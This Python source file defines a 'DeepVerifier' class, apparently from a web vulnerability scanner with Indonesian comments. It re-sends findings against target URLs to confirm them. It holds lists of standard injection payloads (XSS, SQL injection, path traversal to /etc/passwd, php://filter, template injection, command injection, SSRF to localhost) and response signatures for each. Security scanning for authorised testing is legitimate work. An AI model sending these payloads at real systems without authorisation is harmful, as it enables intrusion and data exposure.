# DEEP VERIFIER v50 — Secondary Validation
# ═══════════════════════════════════════════════════════════════

class DeepVerifier:
    """
    🔬 ZOMBIE DEEP VERIFIER v50 — Secondary Validation
    
    Memvalidasi temuan dengan pengecekan sekunder
    untuk mengurangi false positives.
    
    Features:
    - Multi-round verification (up to 3 rounds)
    - Signature-based confirmation per vuln type
    - Differential analysis comparison
    - Alternative payload testing
    - Blind vulnerability confirmation
    - Timing-based verification for blind vulns
    
    🔴 FIX #4: Integrated in STEP 7
    
    Connected to: FuzzerEngine, Database, FilterPipeline
    """
    
    def __init__(self, cfg: Any = None, db: Optional[Any] = None):
        """
        Initialize Deep Verifier v50.
        
        Args:
            cfg: Config instance
            db: Database instance
        """
        self.cfg = cfg
        self.db = db
        self.differential = ResponseDifferentialEngine()
    
    async def verify(
        self, session: Any, findings: List[Dict],
        max_rounds: int = 2,
    ) -> List[Dict]:
        """
        Deep verify all findings with multi-round checking.
        
        Args:
            session: SessionManager instance
            findings: List of findings to verify
            max_rounds: Maximum verification rounds
            
        Returns:
            Enriched findings list
        """
        enriched: List[Dict] = []
        verified = 0
        confirmed = 0
        
        print(f"\n{C.CYAN}{'═'*60}{C.RST}")
        print(f"{C.CYAN}  {I.EYE} DEEP VERIFICATION v50 — {len(findings)} findings{C.RST}")
        print(f"{C.CYAN}{'═'*60}{C.RST}")
        
        for f in findings:
            try:
                test_url = f.get("full_url", f.get("url", ""))
                
                # Round 1: Re-test original payload
                resp = await session.fetch(test_url)
                body = (resp.get("text", "") or "")
                
                if resp.get("status") == 200:
                    f["deep_evidence"] = body[:1000]
                    f["response_length"] = len(body)
                    
                    # Signature-based verification
                    sigs_found = self._check_signatures(f, body)
                    
                    if sigs_found:
                        f["confidence"] = min(100, f.get("confidence", 0) + 10)
                        f["deep_result"] = f"Signatures confirmed: {', '.join(sigs_found[:3])}"
                        f["validation_status"] = "verified"
                        verified += 1
                        confirmed += 1
                        print(f"  {C.GREEN}[{I.CHECK}] {f.get('vuln_type', '?')} — CONFIRMED ({', '.join(sigs_found[:2])}){C.RST}")
                    else:
                        # Round 2: Try alternative payload
                        if max_rounds >= 2:
                            alt_payload = self._get_alternative_payload(f)
                            if alt_payload:
                                alt_url = test_url.replace(
                                    quote(f.get("payload", ""), safe=""),
                                    quote(alt_payload, safe=""),
                                )
                                alt_resp = await session.fetch(alt_url)
                                alt_body = (alt_resp.get("text", "") or "")
                                
                                alt_sigs = self._check_signatures(f, alt_body)
                                if alt_sigs:
                                    f["confidence"] = min(100, f.get("confidence", 0) + 5)
                                    f["deep_result"] = f"Alt payload confirmed: {', '.join(alt_sigs[:2])}"
                                    f["validation_status"] = "verified"
                                    f["alternate_payload"] = alt_payload
                                    verified += 1
                                    print(f"  {C.GREEN}[{I.CHECK}] {f.get('vuln_type', '?')} — CONFIRMED (alt payload){C.RST}")
                                else:
                                    f["deep_result"] = "Not confirmed with alt payload"
                                    f["validation_status"] = "unconfirmed"
                                    print(f"  {C.YELLOW}[{I.WARN}] {f.get('vuln_type', '?')} — unconfirmed{C.RST}")
                            else:
                                f["deep_result"] = "No alternative payload available"
                                f["validation_status"] = "unconfirmed"
                                print(f"  {C.YELLOW}[{I.WARN}] {f.get('vuln_type', '?')} — unconfirmed{C.RST}")
                        else:
                            f["deep_result"] = "Not directly reflected"
                            f["validation_status"] = "unconfirmed"
                            print(f"  {C.YELLOW}[{I.WARN}] {f.get('vuln_type', '?')} — unconfirmed{C.RST}")
                
                elif resp.get("status") >= 500:
                    f["validation_status"] = "potential"
                    f["deep_result"] = "Server error — potential blind vuln"
                    verified += 1
                    print(f"  {C.YELLOW}[{I.WARN}] {f.get('vuln_type', '?')} — 500 error (potential blind){C.RST}")
                
                enriched.append(f)
                
                if self.db:
                    try:
                        self.db.save_finding(f)
                    except Exception:
                        pass
            
            except Exception:
                enriched.append(f)
        
        print(f"\n  {C.GREEN}Verified: {verified}/{len(findings)} | Confirmed: {confirmed}/{len(findings)}{C.RST}")
        
        return enriched
    
    def _check_signatures(self, finding: Dict, body: str) -> List[str]:
        """Check vulnerability signatures in response body."""
        body_lower = body.lower()
        vuln_type = finding.get("vuln_type", "").lower()
        sigs_found = []
        
        deep_sigs = {
            "xss": ["alert(", "onerror=", "<script>", "onload=", "confirm(", "prompt("],
            "sqli": ["sql syntax", "mysql_fetch", "unclosed quotation", "ora-", "sqlstate", "mysql", "postgresql"],
            "lfi": ["root:x:", "daemon:x:", "<web-app", "<?php", "[boot loader]", "for 16-bit app support"],
            "ssti": ["49", "53646432", "hellohello", "HELLO"],
            "cmdi": ["uid=", "gid=", "groups=", "root:", "daemon:"],
            "ssrf": ["instance-id", "ami-id", "computemetadata", "project-id", "droplet_id"],
            "xxe": ["root:x:", "[fonts]", "extensions"],
            "nosql": ["$ne", "$gt", "$regex", "$where"],
        }
        
        for vtype, sigs in deep_sigs.items():
            if vtype in vuln_type:
                for sig in sigs:
                    if sig in body_lower:
                        sigs_found.append(sig)
                break
        
        return sigs_found
    
    def _get_alternative_payload(self, finding: Dict) -> Optional[str]:
        """Get alternative payload for second-round verification."""
        vuln_type = finding.get("vuln_type", "").lower()
        original_payload = finding.get("payload", "")
        
        alternatives = {
            "xss": ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '" onmouseover="alert(1)'],
            "sqli": ["' OR 1=1--", "' AND 1=1--", "' UNION SELECT 1--"],
            "lfi": ['../../../etc/passwd', '....//....//....//etc/passwd', 'php://filter/convert.base64-encode/resource=index.php'],
            "ssti": ['${7*7}', '<%= 7*7 %>', '#{7*7}'],
            "cmdi": ['| id', '&& id', '`id`'],
            "ssrf": ['http://127.0.0.1:80', 'http://[::1]:80', 'http://0.0.0.0:80'],
        }
        
        for vtype, alts in alternatives.items():
            if vtype in vuln_type:
                for alt in alts:
                    if alt != original_payload:
                        return alt
        
        return None


